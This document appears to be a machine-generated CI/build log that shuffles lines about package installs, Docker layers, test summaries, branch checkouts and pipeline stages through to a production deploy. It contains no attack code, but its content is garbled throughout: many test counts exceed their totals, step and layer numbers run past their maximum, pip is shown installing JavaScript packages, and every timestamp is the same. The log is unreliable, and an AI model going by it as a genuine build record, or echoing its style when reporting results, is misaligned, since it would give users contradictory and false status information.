passed, 65 total\nSwitched to branch 'hotfix/task-286'\nVerifying...\nTLS handshake completed\nCoverage: 85% statements, 64% branches\nBuilding Docker image...\nCompiling components/index.js...\nStep 9/21: Installing dependencies\nStep 4/24: Deploying\n\u2713 Task completed in 2223ms\nInstalling react@3.12.1\nWARNING: prettier has known vulnerabilities\nyarn add: Done in 8.21s\nCompiling src/app.ts...\nSuccess!\nSwitched to branch 'feature/task-168'\npip: Installing build dependencies...\nWARNING: webpack has known vulnerabilities\nCache miss for key-3779\nCache miss for key-5875\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:09] INFO: Connecting to database\n[12:46:09] INFO: Connecting to database\nCompleted.\nReady.\n[12:46:09] INFO: Starting build process\npip: Installing build dependencies...\nHEAD is now at b98fc15\nPOST /upload - 201 (351ms)\n[12:46:09] INFO: Processing request\nWaiting...\n\u2713 build completed\nMinifying vendor.js\nMinifying main.js\n[12:46:09] DEBUG: Query executed in 94ms\nInstalling express@3.9.7\n[12:46:09] INFO: Processing request\nPulling image: alpine:3.11\nSuccess!\nWARNING: react has known vulnerabilities\nCompiling src/service.java...\n[12:46:09] DEBUG: Memory usage: 882MB\nTime: 112.992s\nDone.\nEnvironment: development\nUsing Node.js 20.5.1\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache miss for key-2084\nFAILED: test_auth_login\nCache saved successfully\nConnection established\nFetching submodules...\nImage pulled successfully\nUsing Node.js 15.18.4\nPOST /data - 201 (500ms)\nCache restored successfully (133MB)\nUsing Node.js 17.17.4\nSwitched to branch 'bugfix/task-292'\nStep 6/22: Installing dependencies\nTest Suites: 34 passed, 48 total\nnpm notice: created a lockfile\n[12:46:09] INFO: Starting build process\n[12:46:09] WARN: Deprecated API usage\nLayer 5/10: ENV command\n[12:46:09] INFO: Starting build process\nPOST /api - 202 (449ms)\n[12:46:09] INFO: Request completed\nNODE_ENV=development\nTest Suites: 50 passed, 38 total\n[12:46:09] INFO: Processing request\n[12:46:09] WARN: Deprecated API usage\nCoverage: 84% statements, 91% branches\nnpm install: added 470 packages\nStep 4/22: Testing\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 17/17: Linting\nnpm notice: package.json updated\n[12:46:09] WARN: Deprecated API usage\nStep 4/23: Linting\nCreating production build...\nCache invalidated: node_modules\nChecking out main branch\nNODE_ENV=production\n[12:46:09] INFO: Connecting to database\nReady.\n[12:46:09] DEBUG: Initializing service\n[12:46:09] INFO: Cache refreshed\n[12:46:09] INFO: Processing request\n[12:46:09] INFO: Starting build process\n=== Step deploy_staging completed ===\n=== Step: upload_artifacts ===\nWARNING: eslint has known vulnerabilities\n\u2713 build completed\nBuilding Docker image...\n[12:46:09] DEBUG: Query executed in 42ms\nEnvironment: development\nArtifact uploaded: build.tar.gz (39MB)\nOptimizing 70 modules...\n[12:46:09] DEBUG: Memory usage: 1304MB\n\u2713 Task completed in 3191ms\nStep 4/23: Linting\nChecking out master branch\n[12:46:09] INFO: Connecting to database\n[12:46:09] WARN: Deprecated API usage\nFAILED: test_api_health\nLayer 6/12: RUN command\n[12:46:09] DEBUG: Connection pool: 17 active\nCoverage: 80% statements, 92% branches\npip: Downloading prettier-5.8.tar.gz\nStep 8/19: Installing dependencies\nStep 16/17: Installing dependencies\nStep 7/19: Testing\nNODE_ENV=production\nConnection established\nCompiling components/app.ts...\nRan 85 tests in 37s\n  PASS: unit/test_cache_hit.spec.js\nCompiling src/main.py...\nOptimizing 34 modules...\n\u2713 build completed\npip: Downloading lodash-3.18.tar.gz\n[12:46:09] WARN: Deprecated API usage\nOptimizing 98 modules...\nCompleted.\nnpm install: added 430 packages\n  PASS: e2e/test_api_health.spec.js\n[12:46:09] INFO: Cache refreshed\nProcessing...\nStep 14/22: Deploying\nnpm install: resolved 377 packages\nCompiling utils/main.py...\n[12:46:09] INFO: Starting build process\nOK\n[12:46:09] INFO: Starting build process\nCompiling lib/utils.go...\n[12:46:09] ERROR: Connection failed\n\u2713 Step 'build' succeeded\nPlatform: win32-x64\nPOST /api - 202 (451ms)\nBuilding Docker image...\n  PASS: test_auth_login (443ms)\npip install: Successfully installed react-1.17\nFinished.\nReady.\n[12:46:09] INFO: Request completed\n[12:46:09] WARN: Deprecated API usage\nFetching submodules...\nOK\nPlatform: linux-x64\nCache hit for key-9096\nVerifying...\nArtifact uploaded: dist.zip (31MB)\nCache hit for key-4080\nUsing Node.js 16.1.7\nPulling image: alpine:18\nChecking out master branch\nVerifying...\n\u2713 Step 'build' succeeded\n[12:46:09] DEBUG: Loading configuration\nPulling image: alpine:18\nPOST /api - 200 (191ms)\nCompiling src/index.js...\nnpm install: added 377 packages\nArtifact downloaded: 43MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nImage pulled successfully\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: added 31 packages\nNODE_ENV=development\npip install: Successfully installed react-2.4\nGenerating source maps...\nnpm notice: package.json updated\n[12:46:09] DEBUG: Memory usage: 1965MB\nyarn add: Done in 6.44s\nMinifying app.js\n[12:46:09] ERROR: Connection failed\nnpm install: resolved 1735 packages\nCoverage: 91% statements, 93% branches\nTest Suites: 35 passed, 39 total\nHEAD is now at ab56088\nUsing Python 3.12\nEnvironment: test\nReady.\n\u2713 All checks passed\n\u2717 build failed with exit code 16\nTest Suites: 10 passed, 15 total\nCache restored successfully (311MB)\n\u2713 All checks passed\nMinifying app.js\nCreating production build...\nStep 15/23: Installing dependencies\n  PASS: integration/test_auth_login.spec.js\nGET /health - 204 (67ms)\nTests: 50 passed, 82 total\n[12:46:09] INFO: Cache refreshed\n\u2713 All checks passed\nnpm notice: created a lockfile\nnpm install: resolved 526 packages\n[12:46:09] INFO: Request completed\nTLS handshake completed\n\u2713 package completed\nyarn add: Done in 13.5s\npip: Downloading lodash-3.11.tar.gz\nPushing to registry...\nCompiling lib/service.java...\nUsing Node.js 15.1.0\nProcessing...\nWARNING: lodash has known vulnerabilities\nCompiling lib/utils.go...\nOK\nStep 8/17: Running migrations\n[12:46:09] INFO: Request completed\npip: Downloading eslint-2.8.tar.gz\nDone.\nException: NullPointerException\nWaiting...\npip: Installing build dependencies...\n\u2713 All checks passed\nLayer 10/9: COPY command\nException: NullPointerException\nLoading...\nEnvironment: staging\nStep 3/22: Deploying\n[12:46:09] INFO: Connecting to database\nSnapshots: 48 passed, 19 total\nTime: 22.453s\nArtifact downloaded: 25MB\n\u2713 Step 'checkout' succeeded\nChecking out main branch\nSwitched to branch 'bugfix/task-404'\nCoverage: 72% statements, 91% branches\nCompiling components/app.ts...\nSnapshots: 33 passed, 10 total\nChecking out develop branch\nArtifact downloaded: 5MB\n[12:46:09] INFO: Connecting to database\nCoverage: 85% statements, 80% branches\n[12:46:09] DEBUG: Loading configuration\nRan 125 tests in 51s\nStep 13/20: Running migrations\nSuccess!\nLayer 2/14: COPY command\nWARNING: webpack has known vulnerabilities\nPOST /upload - 201 (309ms)\n[12:46:09] WARN: Deprecated API usage\nCache invalidated: dependencies\nBundling runtime.js\nStep 13/22: Running migrations\nCompleted.\nnpm install: added 68 packages\nStep 11/23: Deploying\n=== Step upload_artifacts completed ===\n=== Step: restore_cache ===\nProcessing...\nSuccess!\nArtifact downloaded: 47MB\nPulling image: alpine:3.11\nCompiling src/app.ts...\nHEAD is now at 0213dd8\npip: Downloading prettier-2.20.tar.gz\n[12:46:09] DEBUG: Memory usage: 1787MB\nImage pulled successfully\nyarn add: Done in 10.7s\nAlready up to date.\nCompiling src/utils.go...\n[12:46:09] INFO: Processing request\nCoverage: 84% statements, 65% branches\nCache miss for key-7440\n[12:46:09] INFO: Processing request\n[12:46:09] DEBUG: Loading configuration\nCompiling utils/handler.rs...\nTime: 107.557s\n[12:46:09] DEBUG: Loading configuration\nPushing to registry...\nTest Suites: 6 passed, 36 total\npip: Downloading react-2.7.tar.gz\nCache miss for key-3065\nCache miss for key-8305\nStep 5/22: Installing dependencies\nUsing Node.js 20.12.7\n\u2713 Task completed in 2344ms\nConnection established\n[12:46:09] DEBUG: Memory usage: 328MB\n\u2713 Task completed in 4202ms\nProcessing...\n[12:46:09] INFO: Request completed\nnpm notice: created a lockfile\nException: RuntimeError\nWARNING: express has known vulnerabilities\n[12:46:09] INFO: Starting build process\nImage pulled successfully\nStep 3/21: Linting\n\u2713 build completed\nFetching from https://github.com/package.json\nGET /api - 201 (93ms)\nStep 3/22: Installing dependencies\nBuilding Docker image...\nnpm notice: package.json updated\n[12:46:09] INFO: Processing request\nnpm install: resolved 1759 packages\nArtifact uploaded: build.tar.gz (43MB)\nCache invalidated: dependencies\n[12:46:09] DEBUG: Connection pool: 13 active\nCache invalidated: node_modules\nBuilding Docker image...\n[12:46:09] INFO: Processing request\nReady.\nArtifact downloaded: 36MB\n[12:46:09] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nChecking out develop branch\n[12:46:09] INFO: Processing request\nDone.\n[12:46:09] INFO: Cache refreshed\n[12:46:09] INFO: Processing request\nGenerating source maps...\n[12:46:09] DEBUG: Query executed in 56ms\nDone.\nUsing Node.js 20.10.9\nArtifact downloaded: 17MB\nGenerating source maps...\nCache restored successfully (499MB)\nBuilding Docker image...\nCompiling utils/main.py...\n[12:46:09] WARN: Deprecated API usage\nUploading artifact 'coverage' (7 files)\nHEAD is now at 91b0356\nArtifact downloaded: 27MB\nCache hit for key-4048\nStep 10/16: Linting\nImage pulled successfully\n[12:46:09] WARN: Deprecated API usage\nConnection established\nStep 8/23: Deploying\nChecking out main branch\nTransforming 762 files...\n[12:46:09] DEBUG: Initializing service\nProcessing...\nStep 14/24: Installing dependencies\nTime: 36.793s\nPulling image: alpine:18\nHEAD is now at 083a1d4\n[12:46:09] DEBUG: Memory usage: 722MB\nFAILED: test_cache_hit\n[12:46:09] DEBUG: Loading configuration\nCompleted.\nCompleted.\nStep 3/17: Linting\n[12:46:09] ERROR: Connection failed\nUsing Node.js 17.8.3\nBuilding Docker image...\n\u2713 Task completed in 1376ms\n[12:46:09] ERROR: Connection failed\nCache miss for key-1744\nArtifact uploaded: dist.zip (76MB)\nGenerating source maps...\nStep 1/22: Testing\nArtifact downloaded: 8MB\nPOST /upload - 200 (226ms)\nnpm install: added 74 packages\nCompiling components/app.ts...\nTest Suites: 29 passed, 40 total\n[12:46:09] INFO: Cache refreshed\n  PASS: test_db_connect (437ms)\n[12:46:09] DEBUG: Connection pool: 6 active\npip: Installing build dependencies...\nHEAD is now at c189ca2\nVerifying...\n[12:46:09] INFO: Connecting to database\nFinished.\n[12:46:09] INFO: Connecting to database\n[12:46:09] DEBUG: Query executed in 55ms\nDone.\n  PASS: e2e/test_user_create.spec.js\nConnection established\nTransforming 668 files...\nAlready up to date.\nStep 14/16: Installing dependencies\n[12:46:09] DEBUG: Initializing service\n\u2713 build completed\nFAILED: test_api_health\nEnvironment: production\n\u2713 validate completed\nWaiting...\nFetching from https://docker.io/package.json\n[12:46:09] DEBUG: Memory usage: 660MB\n[12:46:09] INFO: Connecting to database\nUsing Python 3.10\nWARNING: lodash has known vulnerabilities\n[12:46:09] DEBUG: Initializing service\nFinished.\nArtifact downloaded: 40MB\nFetching from https://gcr.io/package.json\nInstalling jest@1.4.0\nUploading artifact 'dist' (6 files)\nStep 17/21: Running migrations\nTransforming 808 files...\nImage pulled successfully\nStep 7/18: Testing\npip: Collecting lodash\nFinished.\n[12:46:09] INFO: Connecting to database\nCompiling utils/index.js...\nWARNING: express has known vulnerabilities\nCache miss for key-3971\nBundling main.css\nSnapshots: 43 passed, 18 total\nStep 15/17: Running migrations\n[12:46:09] DEBUG: Memory usage: 803MB\nFinished.\n[12:46:09] INFO: Processing request\npip install: Successfully installed lodash-4.7\nStep 7/22: Deploying\nCompiling utils/main.py...\n=== Step restore_cache completed ===\n=== Step: unit_tests ===\nCache restored successfully (92MB)\n[12:46:09] INFO: Processing request\nOptimizing 85 modules...\nNODE_ENV=development\n\u2713 validate completed\n[12:46:09] INFO: Connecting to database\nnpm notice: package.json updated\n[12:46:09] DEBUG: Memory usage: 1958MB\nWARNING: eslint has known vulnerabilities\nnpm install: added 418 packages\nStep 10/16: Installing dependencies\n\u2713 build completed\n[12:46:09] ERROR: Connection failed\nRan 46 tests in 22s\nWaiting...\nRan 12 tests in 31s\n[12:46:09] WARN: Deprecated API usage\nCompiling utils/index.js...\nCreating production build...\nStep 17/17: Testing\nStep 1/16: Deploying\nArtifact downloaded: 33MB\nGET /api - 201 (30ms)\n[12:46:09] DEBUG: Memory usage: 942MB\nPlatform: darwin-arm64\n[12:46:09] DEBUG: Connection pool: 9 active\nOptimizing 83 modules...\nLayer 9/8: COPY command\nArtifact uploaded: build.tar.gz (35MB)\n[12:46:09] INFO: Connecting to database\n[12:46:09] DEBUG: Query executed in 96ms\nOK\nFetching from https://npmjs.org/package.json\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCoverage: 75% statements, 72% branches\nHEAD is now at 1158c81\nnpm notice: created a lockfile\n[12:46:09] ERROR: Connection failed\nCache hit for key-2285\nArtifact uploaded: dist.zip (1MB)\nPushing to registry...\nUsing Python 3.9\nPlatform: win32-x64\nFAILED: test_cache_hit\npip install: Successfully installed jest-4.11\npip: Installing build dependencies...\npip: Downloading react-1.1.tar.gz\nLayer 10/10: COPY command\nnpm install: resolved 175 packages\nCache saved successfully\npip install: Successfully installed eslint-5.2\nArtifact downloaded: 38MB\nFinished.\npip: Collecting prettier\nnpm notice: created a lockfile\nFinished.\n[12:46:09] DEBUG: Loading configuration\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\n\u2713 Step 'build' succeeded\n[12:46:09] DEBUG: Memory usage: 1480MB\nCache invalidated: node_modules\nCache hit for key-1875\nLayer 4/8: RUN command\nCompleted.\nLayer 7/9: ENV command\nSwitched to branch 'hotfix/task-979'\nConnection established\nFetching submodules...\npip install: Successfully installed express-2.3\nCompiling src/service.java...\npip install: Successfully installed webpack-4.18\nStep 17/18: Deploying\nNODE_ENV=test\nTests: 499 passed, 353 total\nCoverage: 79% statements, 64% branches\nEnvironment: production\nFetching from https://docker.io/package.json\nWARNING: webpack has known vulnerabilities\nFAILED: test_cache_hit\nInstalling jest@2.19.8\n[12:46:09] ERROR: Connection failed\nCache saved successfully\nEnvironment: development\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFinished.\nUploading artifact 'dist' (32 files)\nAlready up to date.\nDone.\nSwitched to branch 'hotfix/task-719'\nFetching submodules...\nPlatform: linux-x64\nCompiling utils/handler.rs...\nGenerating source maps...\nTests: 455 passed, 66 total\nUploading artifact 'build' (10 files)\nConnection established\npip: Installing build dependencies...\nStep 18/16: Deploying\nBundling main.css\nUploading artifact 'dist' (47 files)\nProcessing...\n\u2713 deploy completed\nArtifact uploaded: dist.zip (81MB)\n[12:46:09] INFO: Processing request\nCache saved successfully\nStep 5/19: Building\nTime: 79.856s\nSuccess!\nConnection established\n[12:46:09] INFO: Connecting to database\nLayer 6/8: COPY command\nUsing Python 3.12\nException: TypeError\nCache saved successfully\nImage pulled successfully\nTLS handshake completed\nStep 8/18: Deploying\nEnvironment: staging\nImage pulled successfully\nWaiting...\n\u2713 deploy completed\nCompiling src/service.java...\nMinifying app.js\nPlatform: darwin-arm64\nCache invalidated: node_modules\nArtifact uploaded: build.tar.gz (4MB)\nLoading...\n[12:46:09] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLayer 9/13: RUN command\nStep 3/15: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nNODE_ENV=production\nPOST /upload - 201 (494ms)\nCompiling components/handler.rs...\n[12:46:09] DEBUG: Query executed in 86ms\nTest Suites: 23 passed, 40 total\n\u2713 Task completed in 2157ms\npip install: Successfully installed axios-5.1\nPulling image: node:3.11\n[12:46:09] INFO: Request completed\nHEAD is now at ec5d26b\nTests: 323 passed, 160 total\nSnapshots: 17 passed, 39 total\nFinished.\nWaiting...\nCompiling utils/service.java...\nVerifying...\nStep 20/16: Testing\nCompleted.\n[12:46:09] INFO: Connecting to database\nTransforming 336 files...\nCreating production build...\nFetching from https://github.com/package.json\nFetching from https://github.com/package.json\nStep 2/25: Linting\nCompiling components/utils.go...\n=== Step unit_tests completed ===\n=== Step: e2e_tests ===\nStep 17/18: Linting\nCache restored successfully (162MB)\nEnvironment: development\n  PASS: test_auth_login (223ms)\nCache invalidated: node_modules\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 14.72s\nCreating production build...\n[12:46:09] DEBUG: Initializing service\nOK\nCompiling components/app.ts...\nWARNING: lodash has known vulnerabilities\nMinifying main.js\nFinished.\nFinished.\nStep 6/19: Deploying\nStep 7/21: Deploying\nLoading...\nAlready up to date.\nPlatform: darwin-arm64\nArtifact uploaded: build.tar.gz (24MB)\nTime: 39.186s\nArtifact uploaded: dist.zip (92MB)\npip: Installing build dependencies...\nWARNING: lodash has known vulnerabilities\nLoading...\n[12:46:09] DEBUG: Loading configuration\nStep 2/18: Linting\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGenerating source maps...\n[12:46:09] INFO: Processing request\nAlready up to date.\nTest Suites: 5 passed, 23 total\nStep 10/24: Testing\npip: Collecting prettier\n[12:46:09] INFO: Request completed\nBundling vendor.css\nOK\npip: Downloading react-2.2.tar.gz\nMinifying main.js\nRan 177 tests in 50s\nException: ValueError\nCache restored successfully (280MB)\nFAILED: test_cache_hit\n[12:46:09] WARN: Deprecated API usage\nCache invalidated: node_modules\n\u2713 Task completed in 280ms\nCompiling components/handler.rs...\nLoading...\nArtifact uploaded: dist.zip (80MB)\nCreating production build...\nCache restored successfully (332MB)\nSnapshots: 41 passed, 24 total\nChecking out main branch\nSwitched to branch 'bugfix/task-464'\n\u2713 validate completed\nMinifying app.js\npip: Downloading webpack-1.10.tar.gz\nOptimizing 39 modules...\nUsing Python 3.9\nTLS handshake completed\nLoading...\nTLS handshake completed\nCompleted.\nStep 16/18: Running migrations\n\u2713 Task completed in 2095ms\n[12:46:09] INFO: Starting build process\nStep 18/22: Deploying\nPushing to registry...\nLayer 1/11: COPY command\npip install: Successfully installed jest-3.20\nArtifact uploaded: build.tar.gz (44MB)\n[12:46:09] INFO: Cache refreshed\npip: Downloading express-5.2.tar.gz\nDone.\nNODE_ENV=development\nBundling vendor.js\nPlatform: darwin-arm64\npip: Downloading express-3.18.tar.gz\nStep 4/15: Deploying\n[12:46:09] DEBUG: Loading configuration\nBuilding Docker image...\nStep 8/18: Linting\nArtifact downloaded: 24MB\n\u2713 All checks passed\nTransforming 796 files...\n[12:46:09] INFO: Request completed\nDone.\npip install: Successfully installed eslint-4.18\nStep 13/24: Building\nCompiling components/service.java...\nEnvironment: production\n  PASS: test_db_connect (344ms)\nInstalling jest@3.6.3\npip install: Successfully installed eslint-3.3\nStep 9/21: Installing dependencies\nUsing Python 3.9\n\u2713 deploy completed\nCompiling lib/main.py...\nArtifact uploaded: dist.zip (37MB)\nCoverage: 84% statements, 80% branches\nUsing Node.js 14.16.6\nWARNING: react has known vulnerabilities\nOK\nLoading...\nCoverage: 100% statements, 65% branches\n[12:46:09] INFO: Connecting to database\n[12:46:09] DEBUG: Loading configuration\n[12:46:09] INFO: Connecting to database\nnpm install: resolved 265 packages\nCompiling lib/main.py...\nArtifact downloaded: 4MB\nTests: 103 passed, 387 total\nPOST /upload - 201 (164ms)\nStep 11/23: Installing dependencies\nArtifact downloaded: 2MB\n[12:46:09] DEBUG: Query executed in 24ms\nFAILED: test_auth_login\nVerifying...\nTest Suites: 29 passed, 18 total\nArtifact downloaded: 33MB\nArtifact uploaded: dist.zip (40MB)\n[12:46:09] WARN: Deprecated API usage\nCache saved successfully\nCompiling lib/index.js...\nAlready up to date.\nInstalling webpack@5.18.9\nSwitched to branch 'feature/task-356'\nDone.\nConnection established\nnpm install: added 487 packages\nWARNING: axios has known vulnerabilities\n[12:46:09] INFO: Request completed\nUsing Python 3.9\n[12:46:09] DEBUG: Memory usage: 1078MB\n[12:46:09] INFO: Request completed\nWARNING: prettier has known vulnerabilities\n  PASS: e2e/test_cache_hit.spec.js\nDone.\nHEAD is now at e94023c\nSwitched to branch 'hotfix/task-283'\nSwitched to branch 'feature/task-280'\nMinifying app.js\n[12:46:09] INFO: Request completed\nCreating production build...\nCompiling utils/service.java...\nStep 19/19: Building\n[12:46:09] INFO: Processing request\npip: Collecting lodash\n[12:46:09] DEBUG: Memory usage: 1299MB\nWARNING: eslint has known vulnerabilities\nChecking out master branch\nCache saved successfully\nCompiling components/service.java...\nWaiting...\nException: RuntimeError\n\u2713 Task completed in 2392ms\n\u2713 Task completed in 1187ms\nUploading artifact 'dist' (6 files)\nProcessing...\n[12:46:09] WARN: Deprecated API usage\n=== Step e2e_tests completed ===\n=== Step: setup_node ===\nCompiling lib/utils.go...\nConnection established\nCompiling lib/service.java...\n[12:46:09] INFO: Starting build process\n[12:46:09] INFO: Processing request\n[12:46:09] INFO: Connecting to database\nCompleted.\n\u2713 Task completed in 3887ms\nEnvironment: test\nCompiling lib/app.ts...\nCompleted.\nOptimizing 68 modules...\nFinished.\nStep 6/25: Deploying\nBundling styles.js\nTest Suites: 32 passed, 36 total\nCompleted.\n[12:46:09] DEBUG: Loading configuration\n[12:46:09] WARN: Deprecated API usage\n[12:46:09] INFO: Connecting to database\nRan 142 tests in 10s\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact downloaded: 14MB\nCompleted.\nCompiling src/service.java...\nCache restored successfully (464MB)\nTime: 118.681s\nRan 155 tests in 33s\nFAILED: test_api_health\n[12:46:09] DEBUG: Memory usage: 335MB\nGenerating source maps...\nUsing Node.js 17.10.1\nTLS handshake completed\nPushing to registry...\n[12:46:09] DEBUG: Loading configuration\nAlready up to date.\nNODE_ENV=test\n[12:46:09] DEBUG: Connection pool: 15 active\nUploading artifact 'build' (29 files)\nCompleted.\nMinifying vendor.js\nCompleted.\nCache restored successfully (201MB)\n[12:46:09] DEBUG: Query executed in 2ms\nPushing to registry...\nGET /api - 204 (6ms)\nDone.\nTLS handshake completed\nCache invalidated: node_modules\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache miss for key-5087\nAlready up to date.\nMinifying main.js\nTransforming 446 files...\nnpm install: resolved 267 packages\n[12:46:09] WARN: Deprecated API usage\nStep 16/20: Installing dependencies\nWARNING: lodash has known vulnerabilities\nRan 56 tests in 17s\nFetching from https://github.com/package.json\nCache invalidated: build\nUsing Node.js 16.17.2\nStep 10/23: Installing dependencies\n[12:46:09] ERROR: Connection failed\nTests: 412 passed, 242 total\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 50 passed, 12 total\nFinished.\n[12:46:09] INFO: Connecting to database\nUploading artifact 'build' (43 files)\nLoading...\npip: Collecting react\nUsing Python 3.11\nCache hit for key-8743\n\u2713 Task completed in 4454ms\nChecking out master branch\nOK\nWARNING: lodash has known vulnerabilities\nStep 11/25: Linting\nStep 1/24: Deploying\nCache miss for key-2049\nStep 12/18: Linting\nCache saved successfully\nCache saved successfully\nOptimizing 54 modules...\nNODE_ENV=development\nPushing to registry...\nUploading artifact 'dist' (48 files)\nDone.\nWaiting...\nWARNING: prettier has known vulnerabilities\nCache saved successfully\n  PASS: test_db_connect (169ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Downloading jest-2.13.tar.gz\n[12:46:09] INFO: Connecting to database\nTLS handshake completed\n[12:46:09] ERROR: Connection failed\nTest Suites: 46 passed, 50 total\n  PASS: e2e/test_auth_login.spec.js\nBundling main.css\nLoading...\nStep 8/19: Linting\nCompiling src/service.java...\nPushing to registry...\nLayer 4/13: RUN command\nyarn add: Done in 1.36s\n\u2713 build completed\nCompleted.\nnpm install: resolved 1496 packages\nDone.\n[12:46:09] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: created a lockfile\nPlatform: darwin-arm64\nCreating production build...\nArtifact uploaded: dist.zip (67MB)\n\u2713 Step 'test' succeeded\nWaiting...\n  PASS: test_api_health (230ms)\nTests: 166 passed, 160 total\n[12:46:09] DEBUG: Memory usage: 1663MB\nSuccess!\n\u2713 All checks passed\nOptimizing 31 modules...\nStep 1/17: Deploying\nSnapshots: 1 passed, 6 total\n[12:46:09] DEBUG: Connection pool: 10 active\nNODE_ENV=development\nPulling image: node:18\nArtifact uploaded: build.tar.gz (35MB)\n[12:46:09] INFO: Processing request\nArtifact downloaded: 41MB\nGenerating source maps...\nTest Suites: 41 passed, 15 total\nPOST /data - 202 (161ms)\nCache saved successfully\nFAILED: test_cache_hit\nOK\nGenerating source maps...\nDone.\nyarn add: Done in 18.49s\nCompiling utils/main.py...\nSwitched to branch 'hotfix/task-536'\n[12:46:09] WARN: Deprecated API usage\nFinished.\nImage pulled successfully\n  PASS: integration/test_cache_hit.spec.js\nPushing to registry...\nStep 18/17: Installing dependencies\nProcessing...\nArtifact uploaded: dist.zip (85MB)\npip: Downloading prettier-3.15.tar.gz\nCompiling components/app.ts...\nCompiling utils/utils.go...\n[12:46:09] DEBUG: Query executed in 81ms\nTests: 332 passed, 111 total\nReady.\nBundling styles.js\n=== Step setup_node completed ===\n=== Step: deploy_production ===\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: express has known vulnerabilities\nStep 11/19: Building\nCompiling src/index.js...\nNODE_ENV=production\nCreating production build...\nGET /status - 204 (14ms)\nEnvironment: test\nArtifact uploaded: dist.zip (26MB)\nGenerating source maps...\nyarn add: Done in 9.71s\nnpm install: resolved 145 packages\nRan 190 tests in 17s\n[12:46:09] INFO: Processing request\nStep 6/15: Testing\nSuccess!\n[12:46:09] INFO: Connecting to database\nHEAD is now at b69ff22\nBuilding Docker image...\n[12:46:09] DEBUG: Connection pool: 3 active\npip install: Successfully installed express-3.14\nWARNING: axios has known vulnerabilities\n  PASS: test_cache_hit (439ms)\nCreating production build...\nWaiting...\nCache hit for key-6543\nInstalling react@3.18.10\n\u2713 All checks passed\n[12:46:09] INFO: Connecting to database\npip: Downloading express-1.8.tar.gz\nWaiting...\npip: Collecting jest\n[12:46:09] INFO: Starting build process\nNODE_ENV=production\nImage pulled successfully\nTime: 85.310s\nUploading artifact 'dist' (31 files)\nCompiling components/main.py...\nStep 3/19: Linting\nArtifact uploaded: build.tar.gz (8MB)\nCoverage: 97% statements, 87% branches\n\u2713 Step 'test' succeeded\nConnection established\nnpm install: added 369 packages\nTime: 25.230s\n  PASS: test_cache_hit (487ms)\nStep 19/19: Running migrations\nCompiling src/handler.rs...\nGenerating source maps...\nStep 5/16: Running migrations\n\u2713 Task completed in 1410ms\nFAILED: test_db_connect\nCache hit for key-9420\nFetching submodules...\nFetching submodules...\nOK\nGenerating source maps...\nTransforming 902 files...\nPulling image: node:latest\nCache invalidated: node_modules\nTest Suites: 34 passed, 47 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCoverage: 93% statements, 81% branches\nStep 14/21: Building\nCompiling src/utils.go...\npip: Downloading express-2.5.tar.gz\nCache saved successfully\nException: ValueError\nArtifact downloaded: 39MB\nyarn add: Done in 5.64s\n\u2713 lint completed\n[12:46:09] ERROR: Connection failed\npip: Collecting prettier\nStep 18/23: Running migrations\npip: Collecting express\n[12:46:09] INFO: Connecting to database\n\u2713 All checks passed\nCache restored successfully (297MB)\n[12:46:09] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 All checks passed\nReady.\nCache miss for key-9887\n[12:46:09] INFO: Processing request\nFAILED: test_user_create\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (8MB)\nBuilding Docker image...\nTime: 68.19s\nUsing Node.js 17.14.9\n[12:46:09] DEBUG: Memory usage: 280MB\nCompiling src/app.ts...\nBundling vendor.js\n  PASS: integration/test_auth_login.spec.js\n[12:46:09] DEBUG: Query executed in 90ms\nFetching from https://github.com/package.json\nMinifying vendor.js\nReady.\n\u2713 lint completed\nCache restored successfully (48MB)\nImage pulled successfully\nCache invalidated: node_modules\n  PASS: integration/test_cache_hit.spec.js\nyarn add: Done in 30.90s\nTime: 64.957s\nPlatform: linux-x64\n[12:46:09] INFO: Cache refreshed\nStep 19/25: Linting\nPulling image: alpine:3.11\nPlatform: win32-x64\nTests: 226 passed, 366 total\n\u2713 All checks passed\nCompiling src/service.java...\n\u2717 build failed with exit code 115\nStep 15/21: Installing dependencies\n  PASS: test_db_connect (358ms)\nVerifying...\nUsing Node.js 16.12.8\nUsing Node.js 17.18.4\n[12:46:09] INFO: Request completed\nUploading artifact 'build' (43 files)\nPulling image: node:3.11\nCache invalidated: dependencies\nCreating production build...\n[12:46:09] INFO: Cache refreshed\nSwitched to branch 'feature/task-990'\n  PASS: integration/test_db_connect.spec.js\nPOST /data - 201 (237ms)\nHEAD is now at 3e41a7f\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTests: 305 passed, 459 total\nHEAD is now at e38d083\nStep 12/16: Linting\nCache saved successfully\nCache restored successfully (371MB)\nCreating production build...\nnpm notice: created a lockfile\nOK\nDone.\nCache miss for key-7257\nWaiting...\n[12:46:09] INFO: Processing request\nStep 1/23: Linting\nStep 9/16: Deploying\n[12:46:09] DEBUG: Connection pool: 19 active\nDone.\n[12:46:09] INFO: Request completed\nGenerating source maps...\nCreating production build...\nDone.\nFAILED: test_db_connect\n\u2717 build failed with exit code 29\n  PASS: test_user_create (81ms)\nCompiling components/app.ts...\nVerifying...\nImage pulled successfully\nnpm install: added 30 packages\nPulling image: node:latest\nyarn add: Done in 18.8s\nHEAD is now at bcf171d\nCompiling components/service.java...\n=== Step 